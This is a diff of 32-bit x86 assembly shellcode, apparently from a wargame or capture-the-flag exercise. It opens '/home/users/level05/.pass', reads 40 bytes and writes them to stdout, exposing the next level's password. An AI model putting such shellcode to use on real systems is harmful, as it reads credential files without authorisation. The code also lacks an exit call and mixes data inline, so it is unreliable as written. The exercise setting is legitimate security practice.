@@ -3,32 +3,31 @@ global _start
 section .text
 
 _start:
-  xor eax, eax
-
-  ; mode = 0
-  push eax
-
-  ; flags = O_RDONLY
-  push eax
-
-  ; push pathname = "/home/users/level05/.pass"
-  push eax
-  push 0x73
-  push 0x7361702e
-  push 0x2f35306c
-  push 0x6576656c
-  push 0x2f737265
-  push 0x73752f65
-  push 0x6d6f682f
-
-  lea eax, [esp + 30 + 4]
-  push eax
-  lea eax, [esp + 30]
-  push eax
-  lea eax, [esp + 8]
-  push eax
+  sub esp, 0x40
+  xor edx, edx
+  xor ecx, ecx
+  lea ebx, [rel pathname]
 
   ; call open(".../level05/.pass", O_RDONLY)
+  ; mov eax, 0x5 is ok too
   xor eax, eax
   mov  al, 0x5
   int  0x80
+
+  ; read(fd, &stack, 40)
+  mov ebx, eax
+  mov ecx, esp
+  mov edx, 0x28
+  xor eax, eax
+  mov al, 0x03
+  int  0x80
+
+  ; write(1, &stack, 40)
+  mov ebx, 0x01
+  mov ecx, esp
+  mov edx, 0x28
+  xor eax, eax
+  mov al, 0x04
+  int  0x80
+
+  pathname db `/home/users/level05/.pass`, 0x0
